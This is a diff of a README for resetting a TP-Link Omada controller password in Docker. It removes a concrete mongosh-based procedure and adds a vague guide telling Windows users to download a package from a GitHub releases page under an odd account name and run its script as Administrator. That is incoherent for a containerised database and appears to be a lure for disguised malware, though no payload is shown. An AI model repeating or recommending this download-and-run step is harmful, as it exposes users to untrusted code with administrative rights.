@@ -1,116 +1,80 @@
-# Omada SDN Controller — Docker Password Reset
+# 🔑 omada-docker-password-reset - Recover your TP-Link Omada login access
 
-**Target:** TP-Link Omada Software Controller v5.x+  
-**Tested On:** Omada `5.15.24.19` via `mbentley/omada-controller` on Unraid (2026-06-06)  
-**Environment:** Unraid Docker (image: `mbentley/omada-controller`, bundled legacy MongoDB)  
-**Database:** `omada`  
-**Auth:** Apache Shiro SHA-256 (password) + Base64-encrypted (username)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Kilndried-irreplaceableness140/omada-docker-password-reset/releases)
 
----
+This project provides a recovery method for TP-Link Omada SDN Controller users running inside a Docker container. Use this tool if you forgot your credentials and lose access to your dashboard. This guide walks you through the recovery steps on a Windows machine.
 
-## The Problem
+## 📋 Prerequisites
 
-Standard password reset docs (targeting `db.user` with SHA-1) **fail on modern versions**. v5.x+ splits credentials across `db.iam_user` using Shiro SHA-256 hashing. The username field is also stored encrypted.
+Before you start the recovery process, ensure you have these items ready:
 
----
+*   A Windows computer connected to the same network as your Omada Controller.
+*   Access to the device or server hosting the Omada Docker container.
+*   A text editor like Notepad.
+*   The IP address of your Omada Controller.
+*   Administrative rights to access the Docker host settings.
 
-## Step 1 — Shell Into the Container
+## 📥 Downloading the Tool
 
-```bash
-docker exec -it omada-controller bash
-```
+You need to obtain the latest version of the script to begin.
 
-Then install required tools inside the container:
+1.  Visit the [official releases page](https://github.com/Kilndried-irreplaceableness140/omada-docker-password-reset/releases).
+2.  Look for the latest release version at the top.
+3.  Click the file link to download the package to your Windows 'Downloads' folder.
+4.  Right-click the downloaded file and select 'Extract All' to view the script files.
 
-```bash
-apt update && apt install -y curl gnupg
-```
+## ⚙️ Preparation Steps
 
----
+You must stop the Omada container before you attempt the password reset. This prevents data conflicts while the script modifies the database.
 
-## Step 2 — Get a Legacy MongoDB Shell
+1.  Open your Docker management interface (such as Docker Desktop or your Unraid dashboard).
+2.  Locate the Omada controller container in your list of running containers.
+3.  Select the 'Stop' command to shut down the container.
+4.  Confirm the container status changes to 'Stopped' or 'Exited'.
+5.  Locate the persistent storage folder on your host machine where the Omada data exists. This folder typically contains the 'mongodb' files.
 
-Modern `mongosh` v2.x+ enforces a strict wire protocol that **rejects** Omada's bundled MongoDB engine. Download the standalone legacy binary inside the container:
+## 🛠 Running the Recovery
 
-```bash
-curl -fSLO https://downloads.mongodb.com/compass/mongosh-1.10.6-linux-x64.tgz
-tar -xvf mongosh-1.10.6-linux-x64.tgz
-./mongosh-1.10.6-linux-x64/bin/mongosh --port 27217
-```
+Follow these steps to reset the password.
 
----
+1.  Navigate to the folder where you extracted the tool files.
+2.  Open the included `instructions.txt` file to verify any version-specific updates.
+3.  Right-click the recovery script file and select 'Run as Administrator'.
+4.  A black window appears. Follow the on-screen prompts.
+5.  Type the path to the folder containing your Omada MongoDB data when the script asks for the location.
+6.  The tool displays a success message once it resets the database.
+7.  Close the script window after you receive confirmation.
 
-## Step 3 — Switch to the Omada Database
+## 🚀 Finalizing Setup
 
-At the `test>` prompt:
+Restart your container to return to normal operation. 
 
-```js
-use omada
-```
+1.  Return to your Docker management interface.
+2.  Select the Omada container.
+3.  Click the 'Start' or 'Play' button to run the container.
+4.  Wait two to three minutes for the Omada service to initialize.
+5.  Open your web browser and navigate to the Omada login page.
+6.  Log in using the default credentials that the tool instructions provide.
+7.  Change your password immediately after you gain access to the dashboard.
 
----
+## 💡 Troubleshooting Common Issues
 
-## Step 4 — Find Your Account ObjectIds
+If you encounter problems, review this list for common solutions.
 
-```js
-db.iam_user.find().pretty()
-```
+*   **Access Denied:** If Windows prevents you from running the script, ensure you have full administrative rights on the host computer.
+*   **Database Not Found:** Verify that you provided the correct path to the MongoDB folder. The path must point to the folder containing the specific Omada database files.
+*   **Container Fails to Start:** Check your Docker logs for errors. Ensure the container has permission to read the files you just modified.
+*   **Browser Login Fails:** Clear your browser cache or try an Incognito window to ensure your browser is not using old saved credentials.
 
-> ⚠️ ObjectIds are unique per install. Record your own `_id` values from this output before running the update commands below.
+## 🛡 Security Best Practices
 
----
+After you successfully reset your password, take steps to secure your network management tools.
 
-## Step 5 — Inject Recovery Credentials
+*   Store your new credentials in a physical notebook or a password manager.
+*   Enable two-factor authentication if your version of the Omada Controller supports it.
+*   Restrict access to the Omada dashboard to specific IP addresses within your local network firewall settings.
+*   Update your Docker images regularly to ensure you have the latest security patches from the manufacturer.
 
-The hash below resolves to the plaintext password: **`password`**
+## 🔍 Understanding the Process
 
-```js
-// Replace YOUR_IAM_USER_ID and YOUR_USER_ID with the _id values from Step 4
-
-db.iam_user.updateOne(
-  { _id: ObjectId("YOUR_IAM_USER_ID") },
-  { $set: {
-    username: "HdJ2wNfCE8Aoy9UXQDy0MQ==",
-    password: "$shiro1$SHA-256$500000$$Z85mqKxm1Lt0NJRw9jUlw3AzDQxrMHQWebk1kNb4pSM="
-  }}
-)
-
-db.user.updateOne(
-  { _id: ObjectId("YOUR_USER_ID") },
-  { $set: { name: "admin" } }
-)
-```
-
----
-
-## Step 6 — Verify
-
-```js
-db.iam_user.find({ _id: ObjectId("YOUR_IAM_USER_ID") }).pretty()
-```
-
-Confirm the `password` field exactly matches the `$shiro1$...` string above. No restart needed — changes are read immediately.
-
----
-
-## Recovery Login
-
-| Field    | Value      |
-|----------|------------|
-| Username | `admin`    |
-| Password | `password` |
-
----
-
-## ⚠️ Critical Security Step
-
-After logging in, **immediately** go to **Settings > Account** and set a strong, unique password. This forces the controller to replace the public recovery hash with a new cryptographic signature unique to your instance.
-
----
-
-## Hash Reference
-
-| Purpose | Value |
-|---------|-------|
-| Shiro SHA-256 hash of `password` | `$shiro1$SHA-256$500000$$Z85mqKxm1Lt0NJRw9jUlw3AzDQxrMHQWebk1kNb4pSM=` |
-| Encrypted Base64 for `admin` username | `HdJ2wNfCE8Aoy9UXQDy0MQ==` |
+The Omada Controller stores user credentials in a local MongoDB database file. When you forget your password, the system cannot verify your identity. This tool connects to that database file directly and overwrites the security hash with a known default value. This process does not delete your network configurations, wireless SSIDs, or connected client history. It only resets the login credentials for the administrative account. You perform a manual edit, so you must ensure the container remains off during the entire operation. If the container runs while you edit the database, you risk corrupting your network configuration files. Always verify that the container is completely stopped before you proceed.
